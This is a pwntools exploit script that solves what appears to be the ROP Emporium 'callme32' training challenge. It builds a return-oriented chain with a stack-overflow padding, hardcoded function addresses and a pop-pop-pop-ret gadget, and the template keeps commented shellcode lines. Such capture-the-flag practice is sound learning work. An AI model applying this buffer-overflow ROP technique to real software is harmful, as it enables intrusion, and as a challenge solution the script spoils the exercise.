```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'

io = start()


io.recvuntil(b">")
call1= p32(0x80484f0)
call2 =p32(0x8048550)
call3 = p32(0x80484e0)
gadget = p32(0x080487f9)
addr = gadget + p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)

payload = b'0'*0x2c+ call1 +addr  +call2+addr +call3 +addr
io.send(payload)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
```
